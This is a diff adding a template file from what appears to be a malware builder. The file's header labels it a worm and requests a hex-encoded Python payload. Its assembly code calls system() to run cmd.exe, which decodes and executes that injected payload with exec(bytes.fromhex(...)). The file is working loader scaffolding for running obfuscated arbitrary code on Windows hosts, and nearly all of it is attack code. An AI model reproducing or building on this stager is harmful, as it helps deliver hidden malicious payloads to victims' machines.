@@ -1,0 +1,31 @@
+#!name##WinScripter
+#!types##worm
+#!info##A worm written in assembler. Runs the command line and calls a python script.
+#!lang##asm
+#!banned##module##starter##shadow##junk
+#!reqPayload##WS_script##Python Script##ENCODE:bytes_hex
+#!system_FLAG##[W]
+#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!globalVar##OS_EXEC##win##Target system executable
+#!processWorm##BasicAsm
+
+global _main:
+
+extern _ExitProcess@4
+extern _system
+
+section .text
+_main:
+    call _execute
+    call _exit
+
+_execute:
+    push command
+    call _system
+
+_exit:
+    push 0
+    call _ExitProcess@4
+
+section .data
+    command db "cmd.exe /C python -c exec(bytes.fromhex('{{WS_script}}')) & pause", 0
